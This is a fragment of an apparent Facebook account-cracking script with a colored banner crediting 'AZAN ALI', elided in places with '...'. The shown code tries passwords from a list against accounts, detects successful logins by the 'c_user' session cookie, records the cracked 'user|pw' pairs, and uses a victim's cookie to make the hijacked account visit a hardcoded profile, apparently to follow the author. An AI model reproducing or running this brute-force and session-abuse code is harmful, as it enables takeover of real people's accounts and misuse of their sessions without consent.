...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\n\x1b[1;92m   ADMIN : \x1b[1;97AZAN ALI  \x1b[1;95mTOOL:\x1b[1;97mFREE   \x1b[1;91mV:\x1b[1;97m1.5.0
...
class __xxx__:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [AXB-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100000138827119', cookies={'cookie': coki}).text, 'html.parser')
